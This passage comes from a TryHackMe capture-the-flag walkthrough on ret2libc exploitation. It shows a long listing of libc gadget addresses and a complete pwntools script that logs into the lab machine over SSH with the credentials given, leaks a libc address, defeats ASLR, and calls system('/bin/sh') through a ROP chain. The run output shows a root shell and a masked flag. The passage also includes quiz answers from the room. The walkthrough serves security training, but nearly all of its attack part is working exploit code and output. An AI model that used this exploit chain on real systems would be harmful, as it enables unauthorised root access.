[+] In '/lib/x86_64-linux-gnu/libc-2.31.so'(0x7f7a2b3ec000-0x7f7a2b43a000), permission=r--
  0x7f7a2b4065bd - 0x7f7a2b4065c4  \u2192   "/bin/sh" 
```

```bash
gef➤  find 0x00007f6beef7b000, 0x00007f6bef0f3000, (char)0x5f, (char)0xc3
0x7f6beef7cb6a <init_cacheinfo+234>
0x7f6beef7d595 <iconv+197>
0x7f6beef7dc83 <__gconv+323>
0x7f6beef7dcfe <__gconv+446>
0x7f6beef7dd12 <__gconv+466>
0x7f6beef7ecc9 <__gconv_find_transform+169>
0x7f6beef7f510 <insert_module+176>
0x7f6beef80444 <__gconv_transform_internal_ucs4+564>
0x7f6beef80a7f <__gconv_transform_ucs4_internal+671>
0x7f6beef81292 <__gconv_transform_internal_ucs4le+530>
0x7f6beef818df <__gconv_transform_ucs4le_internal+687>
0x7f6beef821a0 <__gconv_transform_ascii_internal+688>
0x7f6beef826b2 <__gconv_transform_internal_ascii+434>
0x7f6beef833b5 <__gconv_transform_internal_utf8+597>
0x7f6beef8433b <__gconv_transform_utf8_internal+843>
0x7f6beef852cf <__gconv_transform_ucs2_internal+719>
0x7f6beef85cae <__gconv_transform_internal_ucs2+670>
0x7f6beef86a36 <__gconv_transform_ucs2reverse_internal+742>
0x7f6beef8740e <__gconv_transform_internal_ucs2reverse+670>
0x7f6beef8808c <__GI___gconv_transliterate+492>
0x7f6beef88419 <find_module_idx+185>
0x7f6beef8843a <find_module_idx+218>
0x7f6beef8891c <__gconv_lookup_cache+172>
0x7f6beef895aa <new_composite_name+314>
0x7f6beef897da <__GI_setlocale+250>
0x7f6beef8aae5 <_nl_intern_locale_data+277>
0x7f6beef8c988 <__duplocale+568>
0x7f6beef8d70d <set_binding_values+429>
0x7f6beef8f414 <_nl_find_domain+244>
0x7f6beef8faf7 <_nl_load_domain+1255>
0x7f6beef913e5 <_nl_expand_alias+245>
0x7f6beef919b0 <_nl_make_l10nflist+944>
0x7f6beef91dae <_nl_explode_name+222>
0x7f6beef91f8b <new_exp+91>
0x7f6beef924bf <new_exp+1423>
0x7f6beef95af8 <new_exp+232>
0x7f6beef9633f <new_exp+2351>
0x7f6beef9907f <new_exp+13935>
0x7f6beef999c2 <__gettextparse+914>
0x7f6beef9a03c <catopen+108>
0x7f6beef9a3c5 <__GI___open_catalog+245>
0x7f6beef9d667 <__GI_bsearch+119>
0x7f6beef9dc47 <_quicksort+1495>
0x7f6beef9ef18 <__GI_getenv+120>
0x7f6beefa009d <__cxa_finalize+397>
0x7f6beefa14b8 <strfromf+360>
0x7f6beefa1714 <strfromd+356>
0x7f6beefa1986 <strfroml+374>
0x7f6beefa1ccd <__GI_____strtol_l_internal+461>
0x7f6beefa1d98 <__GI_____strtol_l_internal+664>
0x7f6beefa21dc <__GI_____strtoul_l_internal+428>
0x7f6beefa21fd <__GI_____strtoul_l_internal+461>
0x7f6beefa2773 <str_to_mpn+419>
0x7f6beefa2ae0 <round_and_return+640>
0x7f6beefa2eac <__GI_____strtof_l_internal+316>
0x7f6beefa5593 <str_to_mpn+419>
0x7f6beefa5920 <round_and_return+672>
0x7f6beefa5cec <__GI_____strtod_l_internal+316>
0x7f6beefa8173 <str_to_mpn+435>
0x7f6beefa84f0 <round_and_return+640>
0x7f6beefa88e2 <__GI_____strtold_l_internal+354>
0x7f6beefac29a <__vstrfmon_l_internal+1658>
0x7f6beefad22e <getsubopt+206>
0x7f6beefad4d0 <init+384>
0x7f6beefad990 <fmtmsg+720>
0x7f6beefaef7c <__mpn_divrem+796>
0x7f6beefafbb5 <__mpn_impn_mul_n_basecase+181>
0x7f6beefafd03 <__mpn_impn_mul_n+147>
0x7f6beefb028d <__mpn_impn_sqr_n_basecase+173>
0x7f6beefb03d4 <__mpn_impn_sqr_n+148>
0x7f6beefb0f80 <strfromf128+368>
0x7f6beefb1273 <str_to_mpn+435>
0x7f6beefb16ac <round_and_return+828>
0x7f6beefb1b84 <__GI_____strtof128_l_internal+356>
0x7f6beefb4208 <__correctly_grouped_prefixmb+216>
0x7f6beefb4bae <_i18n_number_rewrite+398>
0x7f6beefb7dfb <parse_printf_format+315>
0x7f6beefb855f <__printf_fphex+1871>
0x7f6beefba374 <__printf_size+628>
0x7f6beefbb93e <__path_search+222>
0x7f6beefbbb1b <__gen_tempname+171>
0x7f6beefcc861 <group_number+49>
0x7f6beefccb0e <_i18n_number_rewrite+398>
0x7f6beefd32d7 <_i18n_number_rewrite+327>
0x7f6beefdb0ac <_IO_new_fdopen+76>
0x7f6beefdbf37 <__GI__IO_fread+215>
0x7f6beefdc419 <__GI__IO_fwrite+281>
0x7f6beefdc692 <_IO_getdelim+450>
0x7f6beefdc8a5 <__GI__IO_getline_info+229>
0x7f6beefdc900 <__GI__IO_getline_info+320>
0x7f6beefdcc56 <__GI__IO_padn+294>
0x7f6beefdcffc <_IO_new_proc_open+140>
0x7f6beefde124 <__vsprintf_internal+212>
0x7f6beefdec5c <_IO_getwline_info+268>
0x7f6beefdecc7 <_IO_getwline_info+375>
0x7f6beefdee76 <_IO_wpadn+294>
0x7f6beefdf9a7 <__vswprintf_internal+231>
0x7f6beefdfc82 <save_for_wbackup+194>
0x7f6beefdff79 <__GI__IO_wdefault_pbackfail+89>
0x7f6beefe035a <__GI__IO_wdefault_xsputn+266>
0x7f6beefe0a93 <__GI__IO_wdefault_xsgetn+323>
0x7f6beefe1108 <_IO_wstr_overflow+152>
0x7f6beefe113f <_IO_wstr_overflow+207>
0x7f6beefe127a <_IO_wstr_overflow+522>
0x7f6beefe13fe <enlarge_userbuf+382>
0x7f6beefe178c <_IO_wstr_seekoff+396>
0x7f6beefe1b71 <__GI__IO_wfile_underflow+657>
0x7f6beefe24c2 <__GI__IO_wfile_seekoff+1058>
0x7f6beefe2c60 <__GI__IO_wdo_write+368>
0x7f6beefe3279 <__GI__IO_wfile_xsputn+281>
0x7f6beefe35f9 <__libio_codecvt_out+201>
0x7f6beefe36e8 <__libio_codecvt_in+200>
0x7f6beefe4c3b <__vasprintf_internal+315>
0x7f6beefe4df2 <__vdprintf_internal+322>
0x7f6beefe4fd1 <__vsnprintf_internal+225>
0x7f6beefe5295 <__obstack_vprintf_internal+309>
0x7f6beefe545f <__obstack_vprintf+303>
0x7f6beefe6c92 <__GI___libc_readline_unlocked+162>
0x7f6beefe6dac <__GI___libc_readline_unlocked+444>
0x7f6beefe7762 <_IO_file_xsgetn_maybe_mmap+242>
0x7f6beefe7bab <_IO_new_file_seekoff+843>
0x7f6beefe8097 <_IO_file_xsgetn_mmap+407>
0x7f6beefe83d8 <__GI__IO_file_xsgetn+408>
0x7f6beefe8657 <_IO_new_file_xsputn+135>
0x7f6beefe9164 <_IO_new_file_fopen+132>
0x7f6beefe99a6 <_IO_new_do_write+262>
0x7f6beefe9bd3 <_IO_new_file_underflow+435>
0x7f6beefe9be8 <_IO_new_file_underflow+456>
0x7f6beefe9c1f <_IO_new_file_underflow+511>
0x7f6beefea77a <save_for_backup+138>
0x7f6beefeb0b3 <__GI__IO_default_xsputn+259>
0x7f6beefeb2fc <__GI__IO_default_xsgetn+316>
0x7f6beefebc7e <_IO_flush_all_lockp+590>
0x7f6beefebfc3 <_IO_cleanup+611>
0x7f6beefec346 <__GI__IO_flush_all_linebuffered+550>
0x7f6beefec6d2 <__GI__IO_default_pbackfail+82>
0x7f6beefecb07 <__GI__IO_str_overflow+343>
0x7f6beefecb47 <__GI__IO_str_overflow+407>
0x7f6beefecba8 <enlarge_userbuf+72>
0x7f6beefed023 <__GI__IO_str_seekoff+371>
0x7f6beefee9c8 <malloc_consolidate+72>
0x7f6beefef707 <__malloc_info+1319>
0x7f6beefef996 <_int_free+342>
0x7f6beeff038e <sysmalloc+398>
0x7f6beeff0e25 <_int_malloc+949>
0x7f6beeff1c05 <_int_memalign+357>
0x7f6beeff1ed6 <_int_realloc+262>
0x7f6beeff2894 <realloc_check+452>
0x7f6beeff391f <__malloc_arena_thread_freeres+319>
0x7f6beeff3bb2 <realloc_hook_ini+322>
0x7f6beeff3f92 <__GI___libc_realloc+274>
0x7f6beeff5030 <__malloc_trim+384>
0x7f6beeff55a2 <__malloc_stats+466>
0x7f6beeff638b <reallochook+507>
0x7f6beeff6a87 <tr_reallochook+407>
0x7f6beeff6cdc <tr_freehook+348>
0x7f6beeff6f76 <tr_mallochook+342>
0x7f6beeff715c <tr_memalignhook+348>
0x7f6beeff7d3e <__GI___libc_dynarray_finalize+94>
0x7f6beeff7d95 <__GI___libc_dynarray_finalize+181>
0x7f6beeff7da6 <__GI___libc_dynarray_finalize+198>
0x7f6beeff8513 <__GI___strerror_r+131>
0x7f6beeff8e50 <two_way_long_needle+832>
0x7f6beeff920e <__strstr_sse2+622>
0x7f6beeff9e58 <two_way_long_needle+632>
0x7f6beeffa054 <__strcasestr+148>
0x7f6beeffa4b2 <strfry+178>
0x7f6beeffa8bf <two_way_long_needle+703>
0x7f6beeffab72 <__GI___memmem+482>
0x7f6beeffad2e <__argz_append+94>
0x7f6beeffada8 <__argz_add+104>
0x7f6beeffae87 <__argz_create+103>
0x7f6beeffb1aa <__argz_insert+218>
0x7f6beeffb4f2 <__argz_replace+482>
0x7f6beeffba1f <envz_add+239>
0x7f6beeffbac7 <envz_merge+119>
0x7f6beeffbb97 <envz_merge+327>
0x7f6beeffbfb0 <__GI___strcoll_l+864>
0x7f6bef0156bd <handle_intel+333>
0x7f6bef0167eb <__wcsrtombs+347>
0x7f6bef016aea <__mbsnrtowcs+346>
0x7f6bef016ea6 <__wcsnrtombs+566>
0x7f6bef017163 <____wcstol_l_internal+99>
0x7f6bef017380 <____wcstol_l_internal+640>
0x7f6bef0175c8 <____wcstoul_l_internal+104>
0x7f6bef017ae1 <str_to_mpn+337>
0x7f6bef017e80 <round_and_return+672>
0x7f6bef018423 <____wcstod_l_internal+787>
0x7f6bef01a479 <str_to_mpn+345>
0x7f6bef01a800 <round_and_return+640>
0x7f6bef01adc1 <____wcstold_l_internal+817>
0x7f6bef01ccc1 <str_to_mpn+337>
0x7f6bef01d040 <round_and_return+640>
0x7f6bef01d5e3 <____wcstof_l_internal+787>
0x7f6bef01feda <__GI___wcscoll_l+890>
0x7f6bef02391a <__mbsrtowcs_l+442>
0x7f6bef024040 <mbrtoc16+432>
0x7f6bef024399 <str_to_mpn+345>
0x7f6bef0247dc <round_and_return+828>
0x7f6bef02546b <____wcstof128_l_internal+2347>
0x7f6bef028eaf <__offtime+799>
0x7f6bef028f44 <__offtime+948>
0x7f6bef0293a4 <ranged_convert+116>
0x7f6bef0299c7 <__mktime_internal+1159>
0x7f6bef02a5a1 <parse_tzname+161>
0x7f6bef02a661 <parse_tzname+353>
0x7f6bef02b271 <__tz_compute+465>
0x7f6bef02bc7e <__tzfile_read+206>
0x7f6bef02cb0c <__tzfile_default+476>
0x7f6bef02cdad <__tzfile_compute+637>
0x7f6bef02de5e <__strptime_internal+894>
0x7f6bef03126d <__strftime_internal+253>
0x7f6bef036b75 <_nl_parse_alt_digit+277>
0x7f6bef03752b <__readdir64_r+283>
0x7f6bef037987 <__scandir64_tail+391>
0x7f6bef037bed <fgetgrent+397>
0x7f6bef037e29 <compat_call+441>
0x7f6bef0380cc <internal_getgrouplist+444>
0x7f6bef039138 <__getgrgid_r+680>
0x7f6bef0395d8 <__getgrnam_r+680>
0x7f6bef0398d2 <__GI__nss_files_parse_grent+258>
0x7f6bef039cc2 <__fgetgrent_r+434>
0x7f6bef039ef4 <__GI___copy_grp+324>
0x7f6bef03a0f2 <__GI___merge_grp+306>
0x7f6bef03a181 <__GI___merge_grp+449>
0x7f6bef03a2f1 <fgetpwent+337>
0x7f6bef03afc5 <__getpwnam_r+517>
0x7f6bef03b3b5 <__getpwuid_r+517>
0x7f6bef03ba4a <__fgetpwent_r+426>
0x7f6bef03baaf <__fgetpwent_r+527>
0x7f6bef03ea4e <prefix_array+190>
0x7f6bef041df3 <internal_fnwmatch+435>
0x7f6bef043b13 <internal_fnmatch+419>
0x7f6bef045575 <check_dst_limits_calc_pos_1+197>
0x7f6bef0455a0 <check_dst_limits_calc_pos_1+240>
0x7f6bef04568d <check_dst_limits_calc_pos_1+477>
0x7f6bef0457e3 <check_dst_limits_calc_pos_1+819>
0x7f6bef0459eb <register_state+203>
0x7f6bef045a32 <register_state+274>
0x7f6bef045b68 <build_wcs_buffer+264>
0x7f6bef046037 <build_wcs_upper_buffer+119>
0x7f6bef046bf1 <re_dfa_add_node+177>
0x7f6bef046eaf <check_subexp_matching_top+239>
0x7f6bef0478b6 <re_string_reconstruct+326>
0x7f6bef048199 <build_charclass+249>
0x7f6bef048a0e <re_compile_fastmap_iter+334>
0x7f6bef048faa <peek_token+282>
0x7f6bef0499d3 <check_dst_limits+419>
0x7f6bef049ca8 <check_node_accept_bytes+472>
0x7f6bef04a7ea <duplicate_node_closure+458>
0x7f6bef04ac01 <calc_eclosure_iter+369>
0x7f6bef04b25e <check_arrival_expand_ecl+318>
0x7f6bef04b707 <sub_epsilon_src_nodes+583>
0x7f6bef04c3fe <re_acquire_state+318>
0x7f6bef04c712 <expand_bkref_cache+258>
0x7f6bef04ce0e <re_acquire_state_context+894>
0x7f6bef04d56a <check_arrival+1434>
0x7f6bef04d75c <get_subexp_sub+76>
0x7f6bef04ee87 <transit_state_bkref+983>
0x7f6bef04f4aa <merge_state_with_log+138>
0x7f6bef04f6e5 <update_cur_sifted_state+181>
0x7f6bef050321 <sift_states_backward+705>
0x7f6bef05143b <re_search_internal+3851>
0x7f6bef0521ae <lower_subexp+606>
0x7f6bef0525e3 <build_charclass_op+787>
0x7f6bef052994 <parse_expression+308>
0x7f6bef055a59 <parse_branch+393>
0x7f6bef055dd5 <parse_reg_exp+757>
0x7f6bef056d0a <re_compile_internal+2314>
0x7f6bef057eff <re_search_stub+383>
0x7f6bef058735 <__GI___regexec+213>
0x7f6bef05890e <__re_match+302>
0x7f6bef058e22 <__re_search+370>
0x7f6bef0592c8 <__re_match_2+152>
0x7f6bef0593ca <__re_search_2+154>
0x7f6bef05961e <prefix_array+190>
0x7f6bef05a749 <exchange+329>
0x7f6bef05b12f <_getopt_internal_r+511>
0x7f6bef05bcf6 <rfc3484_sort+582>
0x7f6bef05c21b <convert_hostent_to_gaih_addrtuple+107>
0x7f6bef05c2dc <convert_hostent_to_gaih_addrtuple+300>
0x7f6bef05c43a <convert_hostent_to_gaih_addrtuple+650>
0x7f6bef05e94d <gaiconf_init+1277>
0x7f6bef06031c <parse_qtd_backslash+76>
0x7f6bef0605c9 <exec_comm+153>
0x7f6bef0612bd <parse_backtick+493>
0x7f6bef061cfa <parse_dollars+490>
0x7f6bef063da1 <parse_arith+385>
0x7f6bef064840 <wordexp+1712>
0x7f6bef065c14 <__spawnix+532>
0x7f6bef0673fb <__euidaccess+123>
0x7f6bef067f61 <__GI___getcwd+721>
0x7f6bef068bac <__ttyname_r+492>
0x7f6bef06962c <ftw_dir+876>
0x7f6bef06a889 <fts_build+1481>
0x7f6bef06b001 <fts_open+673>
0x7f6bef06b4cd <fts_read+413>
0x7f6bef06be0a <internal_fallocate+234>
0x7f6bef06c05a <internal_fallocate64+234>
0x7f6bef06d94f <preadv64v2+159>
0x7f6bef06daaf <pwritev64v2+159>
0x7f6bef06e689 <gethostid+281>
0x7f6bef06f673 <__GI___getmntent_r+227>
0x7f6bef070a49 <getpass+297>
0x7f6bef070d00 <openlog_internal+176>
0x7f6bef071118 <__vsyslog_internal+696>
0x7f6bef0716b4 <openlog+244>
0x7f6bef0720cf <__GI___fcvt_r+479>
0x7f6bef072621 <__GI___qfcvt_r+481>
0x7f6bef072b2e <__GI___hsearch_r+302>
0x7f6bef072bbf <__GI___hsearch_r+447>
0x7f6bef072c39 <__GI___hsearch_r+569>
0x7f6bef073085 <__GI___tsearch+693>
0x7f6bef074ce7 <lsearch+151>
0x7f6bef074d50 <__GI_lfind+96>
0x7f6bef075569 <__error_at_line_internal+249>
0x7f6bef07578e <next_line+110>
0x7f6bef075f7f <getloadavg+223>
0x7f6bef07c429 <__wctype+137>
0x7f6bef07c43f <__wctype+159>
0x7f6bef07cd69 <__wctype_l+121>
0x7f6bef07cd7f <__wctype_l+143>
0x7f6bef07d481 <fgetspent+337>
0x7f6bef07df93 <__getspnam_r+627>
0x7f6bef07e6d3 <__fgetspent_r+403>
0x7f6bef07e739 <__fgetspent_r+505>
0x7f6bef07ef2c <sgetsgent+268>
0x7f6bef07f151 <fgetsgent+337>
0x7f6bef07f3eb <putsgent+459>
0x7f6bef07fa43 <__getsgnam_r+627>
0x7f6bef07fcbe <__GI__nss_files_parse_sgent+414>
0x7f6bef07fe34 <__GI__nss_files_parse_sgent+788>
0x7f6bef07fe85 <__GI__nss_files_parse_sgent+869>
0x7f6bef0800ea <__fgetsgent_r+426>
0x7f6bef08014f <__fgetsgent_r+527>
0x7f6bef080530 <__argp_fmtstream_update+704>
0x7f6bef081042 <argp_doc+802>
0x7f6bef081714 <argp_hol+884>
0x7f6bef081b8d <argp_args_usage+381>
0x7f6bef081c16 <argp_args_usage+518>
0x7f6bef081c3f <argp_args_usage+559>
0x7f6bef0822dd <print_header+493>
0x7f6bef082921 <hol_entry_qcmp+865>
0x7f6bef082c0f <__argp_failure_internal+319>
0x7f6bef0849b7 <__argp_error_internal+199>
0x7f6bef084f61 <convert_options+737>
0x7f6bef0869c7 <__GI___backtrace_symbols_fd+631>
0x7f6bef087749 <__readonly_area+457>
0x7f6bef087c48 <__fread_chk+248>
0x7f6bef0891fb <gethostbyaddr+315>
0x7f6bef089637 <__gethostbyaddr_r+871>
0x7f6bef089c05 <gethostbyname2+373>
0x7f6bef089fb5 <__gethostbyname2_r+693>
0x7f6bef08a525 <__gethostbyname_r+677>
0x7f6bef08ad03 <getnetbyaddr+307>
0x7f6bef08b087 <__getnetbyaddr_r+679>
0x7f6bef08b36f <getnetbyname+287>
0x7f6bef08baa7 <__getnetbyname_r+647>
0x7f6bef08c0b3 <__getprotobynumber_r+627>
0x7f6bef08c973 <__getprotobyname_r+627>
0x7f6bef08cb52 <getservbyname+258>
0x7f6bef08ce2d <__getservbyname_r+525>
0x7f6bef08d121 <getservbyport+257>
0x7f6bef08d3fd <__getservbyport_r+525>
0x7f6bef08dba1 <ether_hostton+241>
0x7f6bef08deed <ether_ntohost+237>
0x7f6bef08e39c <__validuser2_sa+524>
0x7f6bef08e96f <__GI_rresvport_af+111>
0x7f6bef08eec4 <__GI_rcmd_af+1012>
0x7f6bef08f644 <__GI_ruserok_af+196>
0x7f6bef08f734 <ruserok+196>
0x7f6bef08fadc <__GI_rexec_af+460>
0x7f6bef090a57 <__internal_setnetgrent_reuse+375>
0x7f6bef091033 <__GI___internal_getnetgrent_r+355>
0x7f6bef0914d0 <__GI_innetgr+736>
0x7f6bef091fe3 <__getaliasbyname_r+627>
0x7f6bef092581 <__GI_getnameinfo+177>
0x7f6bef0932cb <__if_nameindex+619>
0x7f6bef095ff1 <__idna_name_classify+209>
0x7f6bef09728c <inet_aton_end+220>
0x7f6bef097477 <__GI_inet_ntop+119>
0x7f6bef098477 <res_setoptions+247>
0x7f6bef098f6a <__resolv_conf_load+2202>
0x7f6bef099e3c <do_init+1228>
0x7f6bef099f59 <_res_hconf_reorder_addrs+89>
0x7f6bef09a2ae <_res_hconf_trim_domain+174>
0x7f6bef09a2dd <_res_hconf_trim_domain+221>
0x7f6bef09af3d <resolv_conf_matches+333>
0x7f6bef09ba9b <__resolv_conf_allocate+795>
0x7f6bef09be54 <__resolv_conf_attach+852>
0x7f6bef09bf34 <__resolv_conf_attach+1076>
0x7f6bef09c04d <__resolv_conf_attach+1357>
0x7f6bef09c6ea <nss_parse_service_list+922>
0x7f6bef09cb4d <__GI___nss_database_lookup2+141>
0x7f6bef09cfce <__nss_configure_lookup+110>
0x7f6bef09d034 <__nss_configure_lookup+212>
0x7f6bef09d06d <__nss_configure_lookup+269>
0x7f6bef09dca3 <__nss_getent+179>
0x7f6bef09de60 <__nss_setent+304>
0x7f6bef09e040 <__nss_endent+240>
0x7f6bef09e28c <__nss_getent_r+492>
0x7f6bef09e726 <__nss_hostname_digits_dots_context+358>
0x7f6bef09e748 <__nss_hostname_digits_dots_context+392>
0x7f6bef09ea6d <__GI___nss_hostname_digits_dots+125>
0x7f6bef09f85d <__GI_bindresvport+493>
0x7f6bef09fd72 <clntraw_call+434>
0x7f6bef0a0028 <__GI_callrpc+232>
0x7f6bef0a0b8d <__GI_pmap_rmtcall+317>
0x7f6bef0a0e82 <__GI_clnt_broadcast+738>
0x7f6bef0a2810 <xdrrec_getbytes+528>
0x7f6bef0a2a5f <set_input_fragment+239>
0x7f6bef0a2d9b <__GI_xdrrec_create+251>
0x7f6bef0a3105 <__GI_getpublickey+197>
0x7f6bef0a3248 <__GI_getsecretkey+216>
0x7f6bef0a3e6a <_des_crypt+1242>
0x7f6bef0a4602 <__GI_rtime+114>
0x7f6bef0a49d8 <_svcauth_des+536>
0x7f6bef0a515f <__GI_authdes_getucred+351>
0x7f6bef0a5d73 <__getrpcbyname_r+627>
0x7f6bef0a60c3 <__getrpcbynumber_r+627>
0x7f6bef0a65bd <clntunix_call+493>
0x7f6bef0a6cc7 <__GI_clntunix_create+471>
0x7f6bef0a6fb6 <rendezvous_request+326>
0x7f6bef0a71ff <writeunix+319>
0x7f6bef0a7d9d <__GI_authdes_pk_create+237>
0x7f6bef0a8517 <__GI_authunix_create+375>
0x7f6bef0a937a <clnttcp_call+458>
0x7f6bef0a97f5 <__GI_clnttcp_create+373>
0x7f6bef0a9bfb <clntudp_call+203>
0x7f6bef0aa501 <__GI___libc_clntudp_bufcreate+465>
0x7f6bef0aa7b0 <__GI_clntudp_create+400>
0x7f6bef0abd55 <__GI_netname2user+213>
0x7f6bef0ac036 <__GI___libc_rpc_getport+342>
0x7f6bef0aca9d <__GI_svc_register+109>
0x7f6bef0ad267 <__GI_svc_getreqset+135>
0x7f6bef0ad306 <__GI_svc_getreq_poll+150>
0x7f6bef0ad3fa <__GI_svc_getreq+218>
0x7f6bef0ad6b5 <rendezvous_request+293>
0x7f6bef0adf62 <svcudp_recv+642>
0x7f6bef0ae07f <svcudp_reply+143>
0x7f6bef0ae0c6 <svcudp_reply+214>
0x7f6bef0ae556 <__GI_svcudp_bufcreate+742>
0x7f6bef0aec66 <__GI_xdr_array+150>
0x7f6bef0aedad <__GI_xdr_vector+93>
0x7f6bef0aedc2 <__GI_xdr_vector+114>
0x7f6bef0b14fa <__libc_rpc_gethostbyname+266>
0x7f6bef0b16a7 <nscd_getpw_r+263>
0x7f6bef0b1c79 <nscd_getgr_r+473>
0x7f6bef0b2c04 <__nscd_gethostbyname_r+84>
0x7f6bef0b2c6f <__nscd_gethostbyname2_r+95>
0x7f6bef0b2eda <__nscd_getai+250>
0x7f6bef0b344b <__nscd_getgrouplist+347>
0x7f6bef0b4053 <__nscd_getservbyname_r+83>
0x7f6bef0b40ec <__nscd_getservbyport_r+140>
0x7f6bef0b41d9 <__nscd_setnetgrent+217>
0x7f6bef0b47e9 <wait_on_socket+105>
0x7f6bef0b540d <__nscd_get_map_ref+189>
0x7f6bef0b563f <__nscd_cache_search+415>
0x7f6bef0b5b82 <__getlogin_r_loginuid+370>
0x7f6bef0b6a7b <__libc_getutline_r+251>
0x7f6bef0b6f11 <__libc_pututline+849>
0x7f6bef0b804d <__ptsname_internal+541>
0x7f6bef0b8307 <__ptsname_r+567>
0x7f6bef0b8632 <__GI___dl_iterate_phdr+450>
0x7f6bef0b8850 <__GI__dl_addr+464>
0x7f6bef0b917b <_dl_vsym+331>
0x7f6bef0b9614 <_dl_sym+244>
0x7f6bef0ba0ec <__compat_regexec+172>
0x7f6bef0bc29c <getttyname+652>
0x7f6bef0bc4d2 <getttyname_r+498>
0x7f6bef0ec1cb <__addtf3+795>
0x7f6bef0ec6d3 <__addtf3+2083>
0x7f6bef0ed339 <__divtf3+457>
0x7f6bef0edf80 <__multf3+512>
0x7f6bef0ee3e2 <__multf3+1634>
0x7f6bef0eeb4a <__subtf3+842>
0x7f6bef0ef079 <__subtf3+2169>
0x7f6bef0f088d <free_mem+701>
478 patterns found.
```


______________


```bash
:~/ret2libc# file exploit_me
exploit_me: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2c771960dddc76d1e69e8f741185d232c7ee6098, not stripped
```

```bash
:~/ret2libc# ls
exploit_me  libc.so.6
```

```bash
:~/ret2libc# chmod 777 exploit_me
```

```bash
:~/ret2libc# ls -lah
total 2.0M
drwxr-xr-x  2 root root 4.0K Jan 22 17:38 .
drwxr-xr-x 51 root root 4.0K Jan 22 17:18 ..
-rwxrwxrwx  1 root root 8.2K Sep 12  2021 exploit_me
-rw-r--r--  1 root root 2.0M May 26  2025 libc.so.6
```

```bash
:~/ret2libc# nano exploit.py
```

```bash
:~/ret2libc# ls
exploit_me  exploit.py  libc.so.6
```

```bash
#!/usr/bin/env python3
from pwn import *

# 1. Setup Context
# Load local binary and libc to gather gadgets and offsets
context.binary = binary = ELF('./exploit_me')
libc = ELF('./libc.so.6')
rop = ROP(binary)

# 2. Connection Details
# ===> IMPORTANT: REPLACE THIS IP WITH THE TARGET MACHINE IP <===
host = '10.66.151.55' 
user = 'andy'
password = 'ret2libc!'

# Connect via SSH and spawn the process on the REMOTE machine
s = ssh(user=user, host=host, password=password)
p = s.process('/home/andy/exploit_me')

# 3. Gadgets & Constants
offset = 18
padding = b'A' * offset
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]  # Required for Stack Alignment

# 4. Payload 1: Leak Libc Address
log.info("Sending Payload 1 to leak 'gets' address...")
payload1 = padding
payload1 += p64(pop_rdi)
payload1 += p64(binary.got['gets'])     # Argument: Address of 'gets' in GOT
# payload1 += p64(binary.plt['puts'])     # Function: Call 'puts' to print it
puts_plt = 0x4004a0
payload1 += p64(puts_plt)
payload1 += p64(binary.symbols['main']) # Return to main to keep process alive

p.recvuntil(b'Type your name:')
p.clean()
p.sendline(payload1)

# 5. Calculate Libc Base
p.recvline() # Skip "Your name is..." prompt
# Receive leaked bytes, strip newline, pad to 8 bytes
leaked_bytes = p.recvline().strip().ljust(8, b'\x00')
leak_addr = u64(leaked_bytes)
log.success(f"Leaked gets address: {hex(leak_addr)}")

# Calculate Base Address
libc.address = leak_addr - libc.symbols['gets']
log.success(f"Libc base address: {hex(libc.address)}")

# 6. Payload 2: Get Shell
log.info("Sending Payload 2 for Root Shell...")
bin_sh = next(libc.search(b'/bin/sh'))
system_addr = libc.symbols['system']

payload2 = padding
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)      # Arg: Pointer to "/bin/sh"
payload2 += p64(ret_gadget)  # <--- ALIGNMENT FIX (required for Ubuntu x64)
payload2 += p64(system_addr) # Function: system()

p.sendline(payload2)
p.interactive()
```


```bash
:~/ret2libc# python3 exploit.py
[!] Could not populate PLT: module 'importlib.resources' has no attribute 'files'
[*] '/root/ret2libc/exploit_me'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[!] Could not populate PLT: module 'importlib.resources' has no attribute 'files'
[*] '/root/ret2libc/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[*] Loaded 14 cached gadgets for './exploit_me'
/usr/lib/python3/dist-packages/paramiko/transport.py:220: CryptographyDeprecationWarning: Blowfish has been deprecated and will be removed in a future release
  "class": algorithms.Blowfish,
[+] Connecting to xx.xx.xxx.xx on port 22: Done
[*] andy@10.66.151.55:
    Distro    Ubuntu 20.04
    OS:       linux
    Arch:     amd64
    Version:  5.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on xx.xx.xxx.xx: pid 1471
[!] ASLR is disabled for '/home/andy/exploit_me'!
[*] Sending Payload 1 to leak 'gets' address...
[+] Leaked gets address: 0x7fd047f17970
[+] Libc base address: 0x7fd047e94000
[*] Sending Payload 2 for Root Shell...
[*] Switching to interactive mode
Type your name: 
Your name is: AAAAAAAAAAAAAAAAAA\x83\x06@
# $ id
uid=0(root) gid=1002(andy) groups=1002(andy)
# $ pwd
/home/andy
# $ cd /root
# $ ls
root.txt  snap	source_code.c
# $ cat root.txt
thm{•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••}
# $  
```


<img width="1149" height="759" alt="image" src="https://github.com/user-attachments/assets/6fe69ca2-cc05-45ee-bee9-4bcfefe8b80f" />

<br>
<br>
<br>
<p><em>Answer the question below</em></p>

<p>7.1. <em> What is the flag?</em><br>
<code>thm{•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••}</code></p>

<br>
<h2>Task 8 . Conclusion</h2>
<p>So if you got here, you should have a basic idea of how the ret2libc attack works.<br>

I made the exploiting a little bit harder and didn't turn off the ASLR.<br>

It's turned on by default on most Linux distributions, plus I wanted you to know that it is possible to bypass any of the protections.<br> 

You can still encounter some CTFs where the ASLR will be turned off; in that case, we don't have to leak the base address of the libc, and we can just look at it with the ldd. Thus we are skipping the first ROP chain.<br>

If you want to practice ret2libc, I recommend the TryHackMe room called Chronicle.<br>

- <a href="https://tryhackme.com/room/chronicle">Chronicle</a><br>

If you find any mistakes or just want to ask something, you can contact me on Twitter; the link is on my THM profile.</p>

<p><em>Answer the question below</em></p>

<p>8.1. <em>I hope you enjoyed the room and learned something new.</em><br>
<code>No answer needed</code></p>

<br>
<br>
<br>

